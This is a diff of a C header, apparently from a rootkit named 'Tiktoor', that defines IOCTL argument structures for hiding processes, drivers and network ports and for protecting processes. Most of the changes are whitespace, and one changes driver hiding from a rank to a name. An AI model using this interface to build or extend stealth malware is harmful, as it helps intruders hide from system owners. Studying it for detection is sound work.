@@ -1,23 +1,23 @@
 #define TIKTOOR_IOCTL_CMD 0xdeadbeaf
 
 struct TiktoorCmdArg {
-    unsigned char action;
-    void *subargs;
+    unsigned char action;
+    void *subargs;
 };
 
 struct ProcessHidingSubargs {
-    unsigned int pid;
+    unsigned int pid;
 };
 
 struct DriverHidingSubargs {
-    unsigned int rank;
+    const char* name;
 };
 
 struct PortHidingSubargs {
-    unsigned char transmission_type;
-    unsigned short port;
+    unsigned char transmission_type;
+    unsigned short port;
 };
 
 struct ProcessProtectingSubargs {
-    unsigned int pid;
+    unsigned int pid;
 };
